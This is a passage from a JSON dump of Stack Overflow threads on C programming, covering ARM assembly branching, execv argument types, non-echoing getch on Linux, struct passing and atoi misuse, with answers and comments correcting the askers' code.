better</p>\n\n<pre><code>Disassembly of section .text:\n\n00001000 &lt;my_fun_label-0x8&gt;:\n    1000:   4a01        ldr r2, [pc, #4]    ; (1008 &lt;my_fun_label&gt;)\n    1002:   4710        bx  r2\n    1004:   46c0        nop         ; (mov r8, r8)\n    1006:   46c0        nop         ; (mov r8, r8)\n\n00001008 &lt;my_fun_label&gt;:\n    1008:   0000100d    andeq   r1, r0, sp\n\n0000100c &lt;my_fun&gt;:\n    100c:   4770        bx  lr\n    100e:   46c0        nop         ; (mov r8, r8)\n</code></pre>\n\n<p>self modifying code is another story you might have to use barriers and/or deal with caching, etc...</p>\n"}], "owner": {"reputation": 9, "user_id": 6528137, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CzZGnk4B6UU/AAAAAAAAAAI/AAAAAAAAABs/VYzGOTvfCTc/photo.jpg?sz=128", "display_name": "Kakses", "link": "https://stackoverflow.com/users/6528137/kakses"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 219, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1544712624, "creation_date": 1544623705, "last_edit_date": 1544712624, "question_id": 53744854, "link": "https://stackoverflow.com/questions/53744854/arm-assembler-bx-jump-to-nowhere", "title": "arm assembler: bx jump to nowhere", "body": "<p>I try to write some assembler code inside C, and then call C function. My code is as follows:<br/>\nC:</p>\n\n<pre><code>void my_fun(uint32_t *arg) {\n   //sth\n}\n</code></pre>\n\n<p>Assembler: <br></p>\n\n<pre><code>ldr r2, my_fun_label\nbx r2\nmy_fun_label: .word my_fun \n</code></pre>\n\n<p>Using debuger I found r2 register contains some random value instead my_fun addres. So program branch to nowhere, and stays freezes. Can someone help me?<br/>\nI'm using nRF52 ARM Cortex M4 microcontroller.</p>\n\n<p>Edit:\nThe results </p>\n\n<pre><code>0003ea0a: my_fun: \n\nasm_test: \n0003ea26: ldr r2, [pc, #0] ;(0x3ea28 &lt;asm_test+2&gt;) \n0003ea28: bx r2 \n0003ea2a: and.w r0, sp, r3\n</code></pre>\n\n<p>but <code>my_fun_label</code> seems points to <code>0x0dea0300</code></p>\n"}, {"tags": ["c", "execv"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1544623745, "post_id": 53744791, "comment_id": 94342038, "body": "Hang on. If this compiled and you got output the problem has little to do with implicit conversions. Are you asking about a compiler error? Or a rumtime error?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "edited": false, "score": 3, "creation_date": 1544623999, "post_id": 53744791, "comment_id": 94342185, "body": "<code>const</code> is the least of your problems. A two-dimensional array is fundamentally different from an array of pointers."}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 1, "creation_date": 1544625032, "post_id": 53744791, "comment_id": 94342788, "body": "Compile with <code>-Wall</code> and pay attention to the warnings. There are a few problems with this code. The call to <code>foo</code> is also incorrect."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544625366, "post_id": 53744791, "comment_id": 94342991, "body": "Do not post code with line numbers.  It substantially reduces the value of posting code at all."}, {"owner": {"reputation": 313, "user_id": 9177237, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-JZiMkLmYzeM/AAAAAAAAAAI/AAAAAAAAAdA/SEAJiICrib0/photo.jpg?sz=128", "display_name": "Z E Nir", "link": "https://stackoverflow.com/users/9177237/z-e-nir"}, "edited": false, "score": 0, "creation_date": 1544625947, "post_id": 53744791, "comment_id": 94343353, "body": "Thanks for your advices. few points: I talked about runtime error. compiling with <code>-Wall</code> didn&#39;t change the results (it compiled with the same warnings). I didnt knew there is so much difference between 2D array to array of pointers, as long as I know its just a different way to allocate the memory... and I will stop post code with line numbers... :)"}], "answers": [{"comments": [{"owner": {"reputation": 313, "user_id": 9177237, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-JZiMkLmYzeM/AAAAAAAAAAI/AAAAAAAAAdA/SEAJiICrib0/photo.jpg?sz=128", "display_name": "Z E Nir", "link": "https://stackoverflow.com/users/9177237/z-e-nir"}, "edited": false, "score": 0, "creation_date": 1544639842, "post_id": 53745736, "comment_id": 94351251, "body": "Wonderful explanation, those charts are great and helped me to understand the topic - thanks!"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "is_accepted": false, "score": 3, "last_activity_date": 1544626589, "creation_date": 1544626589, "answer_id": 53745736, "question_id": 53744791, "link": "https://stackoverflow.com/questions/53744791/why-execv-cant-use-implicit-convert-from-char-to-char-const/53745736#53745736", "title": "why `execv` can&#39;t use implicit convert from char** to char* const*?", "body": "<p>A two-dimensional array looks like this:</p>\n\n<pre><code>char myargs[2][16];\n\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>I reduced the size from 64 to 16 to keep the diagram from being annoyingly big.</p>\n\n<p>With an initializer, it can look like this:</p>\n\n<pre><code>char myargs[2][16] = { \"/bin/ls\", \"\" }\n\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n| /| b| i| n| /| l| s|\\0|  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|\\0|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>Notice I didn't try to put a null pointer in the second row. It doesn't make sense to do that, since that's an array of chars. There's no place in it for a pointer.</p>\n\n<p>The rows are contiguous in memory, so if you look at a lower level, it's actually more like this:</p>\n\n<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n| /| b| i| n| /| l| s|\\0|  |  |  |  |  |  |  |  |\\0|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>When you pass <code>myargs</code> to a function, the famous \"array decay\" produces a pointer. That looks like this:</p>\n\n<pre><code>void foo(char (*arg)[16]);\n...\nchar myargs[2][16] = { \"/bin/ls\", \"\" }\nfoo(myargs);\n\n+-----------+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|  POINTER==|===&gt;| /| b| i| n| /| l| s|\\0|  |  |  |  |  |  |  |  |\\0|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+-----------+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>The pointer is <code>arg</code> contains a value which locates the beginning of the array. Notice there is no pointer pointing to the second row. If <code>foo</code> wants to find the value in the second row, it needs to know how big the rows are so it can break down this:</p>\n\n<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n| /| b| i| n| /| l| s|\\0|  |  |  |  |  |  |  |  |\\0|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>into this:</p>\n\n<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n| /| b| i| n| /| l| s|\\0|  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|\\0|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>That's why <code>arg</code> must be <code>char (*arg)[16]</code> and not <code>char **arg</code> or the equivalent <code>char *arg[]</code>.</p>\n\n<p>The <code>exec</code> family of functions doesn't work with this data layout. It wants this:</p>\n\n<pre><code>+-----------+    +-----------+-----------+\n|  POINTER==|===&gt;|  POINTER  |    NULL   |\n+-----------+    +-----|-----+-----------+\n                       |\n/----------------------/\n|\n|\n|    +--+--+--+--+--+--+--+--+\n\\---&gt;| /| b| i| n| /| l| s|\\0|\n     +--+--+--+--+--+--+--+--+\n</code></pre>\n\n<p>And when you want to add more arguments, it wants this:</p>\n\n<pre><code>+-----------+    +-----------+-----------+-   -+-----------+\n|  POINTER==|===&gt;|  POINTER  |  POINTER  | ... |    NULL   |\n+-----------+    +-----|-----+-----|-----+-   -+-----------+\n                       |           |\n/----------------------/           |\n|                                  |\n| /--------------------------------/\n| |\n| |\n| |  +--+--+--+--+--+--+--+--+\n\\-+-&gt;| /| b| i| n| /| l| s|\\0|\n  |  +--+--+--+--+--+--+--+--+\n  |\n  |  +--+--+--+--+--+--+\n  \\-&gt;| /| h| o| m| e|\\0|\n     +--+--+--+--+--+--+\n</code></pre>\n\n<p>If you compare this to the two-dimensional array diagram, hopefully you can understand why this can't be an implicit conversion. It actually involves moving stuff around in memory.</p>\n"}, {"comments": [{"owner": {"reputation": 313, "user_id": 9177237, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-JZiMkLmYzeM/AAAAAAAAAAI/AAAAAAAAAdA/SEAJiICrib0/photo.jpg?sz=128", "display_name": "Z E Nir", "link": "https://stackoverflow.com/users/9177237/z-e-nir"}, "edited": false, "score": 0, "creation_date": 1544640064, "post_id": 53745853, "comment_id": 94351367, "body": "Thanks for the great exlpanation and for the <b>solutions you suggest</b>. I can try the explicit casting, but I decided to make some major changes in the code I&#39;m working on that bring up my question in the first place. So instead of the <code>char[][]</code> I will use <code>char * const *</code> as you said..."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 2, "last_activity_date": 1544640069, "last_edit_date": 1544640069, "creation_date": 1544627023, "answer_id": 53745853, "question_id": 53744791, "link": "https://stackoverflow.com/questions/53744791/why-execv-cant-use-implicit-convert-from-char-to-char-const/53745853#53745853", "title": "why `execv` can&#39;t use implicit convert from char** to char* const*?", "body": "<blockquote>\n  <p>Both <code>foo</code> and <code>execv</code> require <code>char * const *</code> argument,</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<blockquote>\n  <p>but while my <code>foo</code> works (I get success in the output) the system call <code>execv</code> fails.</p>\n</blockquote>\n\n<p>Getting the output you expect does not prove that your code is correct.  The call exhibits undefined behavior because its argument does not match the parameter type, but it is plausible that that has little practical effect because the implementation of <code>foo()</code> does not use the parameter in any way.  More generally, your code could, in principle, exhibit absolutely any behavior at all, because that's what \"undefined\" means.</p>\n\n<blockquote>\n  <p>I would like to know why. Does this have something to do with the implementation of <code>execv</code>?</p>\n</blockquote>\n\n<p>From the standard's perspective, both calls exhibit equally undefined behavior.  As a practical matter, however, we know that <code>execv</code> does use its arguments, so it would be much more surprising for that call to produce the behavior you expected than it is for the call to <code>foo</code> to produce the behavior you expected.</p>\n\n<p>The main problem is that <a href=\"https://stackoverflow.com/a/7949598/2402272\">2D arrays are arrays of arrays</a>, and <a href=\"https://stackoverflow.com/q/10186765/2402272\">arrays are not pointers</a>.  Thus, your 2D array <code>myargs</code> does not at all have the correct type for an argument to either function.</p>\n\n<blockquote>\n  <p>Also, assuming I have a char** variable - how can I send it to execv?</p>\n</blockquote>\n\n<p>You do not have such a variable in your code, but if you did have, you could cast it to the appropriate type:</p>\n\n<pre><code>char *some_args[] = { \"/bin/ls\", NULL };\nexecv((char * const *) some_args);\n</code></pre>\n\n<p>In practice, most compilers would probably accept it if you omitted the cast, too, although the standard does require it.  Best would be to declare a variable that has the correct type in the first place:</p>\n\n<pre><code>char * const correct_args[] = { \"/bin/ls\", NULL };\nexecv(correct_args);\n</code></pre>\n\n<p>Note also that although arrays are not pointers, they are <em>converted</em> to pointers in most contexts -- which I use in the example code -- but only the top level.  An array of arrays thus \"decays\" to a pointer to an array, not a pointer to a pointer.</p>\n"}], "owner": {"reputation": 313, "user_id": 9177237, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-JZiMkLmYzeM/AAAAAAAAAAI/AAAAAAAAAdA/SEAJiICrib0/photo.jpg?sz=128", "display_name": "Z E Nir", "link": "https://stackoverflow.com/users/9177237/z-e-nir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 53745853, "answer_count": 2, "score": 1, "last_activity_date": 1544640069, "creation_date": 1544623483, "last_edit_date": 1544625597, "question_id": 53744791, "link": "https://stackoverflow.com/questions/53744791/why-execv-cant-use-implicit-convert-from-char-to-char-const", "title": "why `execv` can&#39;t use implicit convert from char** to char* const*?", "body": "<p>Consider the following code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid foo(char * const arg[]) {\n    printf(\"success\\n\");\n}\n\nint main() {\n    char myargs[2][64] = { \"/bin/ls\", NULL };\n\n    foo(myargs);\n    execv(myargs[0], myargs);\n    return 0;\n}\n</code></pre>\n\n<p>Both <code>foo</code> and <code>execv</code> require <code>char * const *</code> argument, but while my <code>foo</code> works (I get <code>success</code> in the output) the system call <code>execv</code> fails.</p>\n\n<p>I would like to know why.  Does this have something to do with the implementation of <code>execv</code>?</p>\n\n<p>Also, assuming I have a <code>char**</code> variable - how can I send it to <code>execv</code>?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 1, "creation_date": 1544623914, "post_id": 53744728, "comment_id": 94342131, "body": "Please edit the question to have a complete (Windows+MinGW?) program as example (so if someone wants to test it, they can just copy-paste and verify). Then, to clarify, you are asking how to achieve the same on Linux?"}, {"owner": {"reputation": 3, "user_id": 10780830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7d188787afe9d03c745a9aae9e3796?s=128&d=identicon&r=PG&f=1", "display_name": "Yas", "link": "https://stackoverflow.com/users/10780830/yas"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1544625279, "post_id": 53744728, "comment_id": 94342936, "body": "Thank you for your answer . Yes my question was : how to get a character using getch() without echo and without pressing ENTER"}, {"owner": {"reputation": 162, "user_id": 10395587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2b548dbfa2977701ebe0b35d9ed8207?s=128&d=identicon&r=PG&f=1", "display_name": "manoliar", "link": "https://stackoverflow.com/users/10395587/manoliar"}, "edited": false, "score": 0, "creation_date": 1544628170, "post_id": 53744728, "comment_id": 94344701, "body": "Have in mind, that getch() is a non-standard function."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 10780830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7d188787afe9d03c745a9aae9e3796?s=128&d=identicon&r=PG&f=1", "display_name": "Yas", "link": "https://stackoverflow.com/users/10780830/yas"}, "edited": false, "score": 0, "creation_date": 1544629935, "post_id": 53746122, "comment_id": 94345836, "body": "Thank you for your reply . So you mean there is a solution to get rid of the ENTER on linux ? Sorry i&#39;m still a beginner"}], "tags": [], "owner": {"reputation": 180, "user_id": 5201753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec7f615580570a12e6b598cfa7e6d060?s=128&d=identicon&r=PG&f=1", "display_name": "Frediano Ziglio", "link": "https://stackoverflow.com/users/5201753/frediano-ziglio"}, "is_accepted": true, "score": 2, "last_activity_date": 1544631931, "last_edit_date": 1544631931, "creation_date": 1544627932, "answer_id": 53746122, "question_id": 53744728, "link": "https://stackoverflow.com/questions/53744728/avoid-pressing-enter-with-getch-on-linux-gcc-no-echo/53746122#53746122", "title": "Avoid pressing enter with getch() on linux ( GCC ) &quot;No-echo&quot;", "body": "<p>Unix (and so Linux) have a concept of terminal (TTY) which can be pretty complicated.\nEvery process can be associated with a terminal (and lot actually are).\nThis terminal has different options like the ECHO you mentioned and the LINE BUFFER (which is the enter problem which you reported).\nTo set a terminal the low level APIs are termios (see \"man termios\").\nAnother more friendly API is ncurses (see \"man ncurses\"). For instance at <a href=\"https://www.mkssoftware.com/docs/man3/curs_inopts.3.asp\" rel=\"nofollow noreferrer\">https://www.mkssoftware.com/docs/man3/curs_inopts.3.asp</a> you can see some function for different settings.</p>\n\n<p>An easy example with ncurses (you can compile with \"gcc -O2 source.c -o output -lncurses\"):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ncurses.h&gt;\n\nint main(void)\n{\n        initscr();\n        cbreak();\n        noecho();\n        int n = getch();\n        printf(\"%d %c\\n\", n, n);\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 10780830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7d188787afe9d03c745a9aae9e3796?s=128&d=identicon&r=PG&f=1", "display_name": "Yas", "link": "https://stackoverflow.com/users/10780830/yas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "accepted_answer_id": 53746122, "answer_count": 1, "score": -1, "last_activity_date": 1544631931, "creation_date": 1544623284, "last_edit_date": 1544626251, "question_id": 53744728, "link": "https://stackoverflow.com/questions/53744728/avoid-pressing-enter-with-getch-on-linux-gcc-no-echo", "title": "Avoid pressing enter with getch() on linux ( GCC ) &quot;No-echo&quot;", "body": "<p>In the next code: I don't have to press Enter to get the character with getch() and this is only applicable on Windows (mingw) . I am programming a simple stopwatch wich react if a keyboard-key is pressed without the need to press ENTER , but the same thing doesn't work on linux ( GCC ) .And i have to find a solution only using getch() with no echo. I've been Googling around with no luck.  Thank you in advance. \nPS: I am a c/c++ beginner.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main(void) {\n  printf(\"\\n\\t\\tStopwatch \\n\\n \\t Press S to start \\n\\n\");\n  time_t start;\n  char c ;\n  struct tm tm ;\n  do {\n    c=getch(); /*get the Character without pressing ENTER*/\n    if (c!= 'S' &amp;&amp; c!= 's') printf(\"\\nWrong key. Please press'S' to Start\\n\");\n  } while(c!= 'S' &amp;&amp; c!= 's');\n  start=time(NULL);\n  tm = *localtime(&amp;start);\n  printf(\"\\n Starting time :: %d:%d:%d \\n\", tm.tm_hour, tm.tm_min, tm.tm_sec);\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "function", "struct"], "answers": [{"tags": [], "owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "is_accepted": true, "score": 1, "last_activity_date": 1544623103, "creation_date": 1544623103, "answer_id": 53744678, "question_id": 53744622, "link": "https://stackoverflow.com/questions/53744622/a-struct-initialised-in-a-function-how-can-i-use-the-values/53744678#53744678", "title": "A struct initialised in a function how can i use the values?", "body": "<p>You need to do</p>\n\n<pre><code>int main(void) {\n    struct anzeige a; // or Anzeige a; using the typedef\n    a = initialisiere_anzeige();\n    zeichnen(a);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 10781173, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-w1ytxBkjP68/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-hetzS0PeBRoryZN3p7lH-rARTXVA/mo/photo.jpg?sz=128", "display_name": "Lukas Pilsl", "link": "https://stackoverflow.com/users/10781173/lukas-pilsl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 53744678, "answer_count": 1, "score": 0, "last_activity_date": 1544624759, "creation_date": 1544622939, "last_edit_date": 1544624759, "question_id": 53744622, "link": "https://stackoverflow.com/questions/53744622/a-struct-initialised-in-a-function-how-can-i-use-the-values", "title": "A struct initialised in a function how can i use the values?", "body": "<p>i have a struct that is filled with data in a function. \nNow i wanna know how i can use this data with an other function. </p>\n\n<p>what should i write in my main function? </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct anzeige\n{\nchar gesamtzahl_zeilen_sonne;\nchar sichtbare_zeilen_sonne;\nchar himmel[80];\nchar horizont[80];\nchar sonne[20][80];\nchar text_fuer_benutzer[200];\nint sleep; // ms f\ufffdr Animation\n} Anzeige;\n\nAnzeige initialisiere_anzeige()\n{\nAnzeige a;\nstrcpy(a.himmel, \" \\n\");\nstrcpy(a.sonne[0], \"          o o              \\n\");\nstrcpy(a.sonne[1], \"      o         o          \\n\");\nstrcpy(a.sonne[2], \"    o    ()  ()   o        \\n\");\nstrcpy(a.sonne[3], \"   o               o       \\n\");\nstrcpy(a.sonne[4], \"   o        V      o       \\n\");\nstrcpy(a.sonne[5], \"    o    &lt;____&gt;   o        \\n\");\nstrcpy(a.sonne[6], \"      o         o          \\n\");\nstrcpy(a.sonne[7], \"          o o              \\n\");\nstrcpy(a.sonne[8], \"                           \\n\");\nstrcpy(a.sonne[9], \"                           \\n\");\nstrcpy(a.horizont, \"---------------------------\\n\\n\");\na.gesamtzahl_zeilen_sonne = 10;\na.sichtbare_zeilen_sonne = 10;\nstrcpy(a.text_fuer_benutzer, \"\\'u\\': Untergang\\t \\'a\\':\\n\\nAuswahl: \");\na.sleep = 50;\nreturn a;\n}\n\nvoid zeichnen(struct Anzeige a){\n\n}\n\nint main(){\n\nzeichnen(struct Anzeige a);\n\nreturn 0;\n}\n</code></pre>\n\n<p>i want to print the sun with an extra function. (zeichnen)</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 4268, "user_id": 5897829, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c2c7105808cb099e98f04fe464af68c6?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Verjans", "link": "https://stackoverflow.com/users/5897829/martin-verjans"}, "edited": false, "score": 1, "creation_date": 1544623043, "post_id": 53744585, "comment_id": 94341657, "body": "<a href=\"https://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm\" rel=\"nofollow noreferrer\">atoi()</a> function is expecting a null terminated string as parameter, not a char."}, {"owner": {"reputation": 13228, "user_id": 8398549, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8tzrl.jpg?s=128&g=1", "display_name": "Cid", "link": "https://stackoverflow.com/users/8398549/cid"}, "edited": false, "score": 0, "creation_date": 1544623134, "post_id": 53744585, "comment_id": 94341698, "body": "I&#39;d replace that for loop by simply <code>arr[num]++;</code>"}, {"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "reply_to_user": {"reputation": 4268, "user_id": 5897829, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c2c7105808cb099e98f04fe464af68c6?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Verjans", "link": "https://stackoverflow.com/users/5897829/martin-verjans"}, "edited": false, "score": 0, "creation_date": 1544623343, "post_id": 53744585, "comment_id": 94341811, "body": "@MartinVerjans why does the function  work properly initially then?"}, {"owner": {"reputation": 458, "user_id": 8420233, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5JX6a.png?s=128&g=1", "display_name": "absoluteAquarian", "link": "https://stackoverflow.com/users/8420233/absoluteaquarian"}, "edited": false, "score": 0, "creation_date": 1544623426, "post_id": 53744585, "comment_id": 94341851, "body": "@Curfew a string is an array of characters with a NULL terminator (<code>\\0</code>) at the end.  you don&#39;t supply a NULL-terminated string in your <code>atoi()</code> call, so this is undefined behaviour at best."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1544623540, "post_id": 53744585, "comment_id": 94341930, "body": "<code>char text;</code> <b>--&gt;&gt;</b> <code>int text;</code> (or EOF will not work properly)"}, {"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "reply_to_user": {"reputation": 458, "user_id": 8420233, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5JX6a.png?s=128&g=1", "display_name": "absoluteAquarian", "link": "https://stackoverflow.com/users/8420233/absoluteaquarian"}, "edited": false, "score": 0, "creation_date": 1544624042, "post_id": 53744585, "comment_id": 94342209, "body": "@Tau Thanks for clarifying on that, so even if it did work in some cases it can be considered undefined behaviour?"}, {"owner": {"reputation": 458, "user_id": 8420233, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5JX6a.png?s=128&g=1", "display_name": "absoluteAquarian", "link": "https://stackoverflow.com/users/8420233/absoluteaquarian"}, "edited": false, "score": 0, "creation_date": 1544624143, "post_id": 53744585, "comment_id": 94342267, "body": "Yes, that&#39;s why it&#39;s called undefined behaviour.  See <b>Andrew Henle</b>&#39;s comment on his answer."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1544624349, "post_id": 53744585, "comment_id": 94342379, "body": "@Curfew -- the code is calling <code>atoi()</code> after each <code>char</code> is entered, and <code>text</code> points to the entered <code>char</code> in each case. The byte following <code>text</code> may be <code>\\0</code> in some cases, and code might appear to work sometimes."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "edited": false, "score": 0, "creation_date": 1544623977, "post_id": 53744715, "comment_id": 94342169, "body": "Thank you for your answer, but I&#39;m still not sure why it worked in some cases."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "edited": false, "score": 0, "creation_date": 1544624078, "post_id": 53744715, "comment_id": 94342229, "body": "@Curfew The first byte after <code>char text</code> was likely <code>&#39;\\0&#39;</code> or the equivalent of a non-digit <code>char</code> value. Undefined behavior is undefined.  Note also the update to properly handle the fact that <code>getchar()</code> returns <code>int</code>, not <code>char</code>."}, {"owner": {"reputation": 3, "user_id": 10776338, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Nw1MD3haZXk/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iye1Vc_xim5HU7z6y2325fo-78RQ/mo/photo.jpg?sz=128", "display_name": "Curfew", "link": "https://stackoverflow.com/users/10776338/curfew"}, "edited": false, "score": 0, "creation_date": 1544624694, "post_id": 53744715, "comment_id": 94342597, "body": "Thanks for the 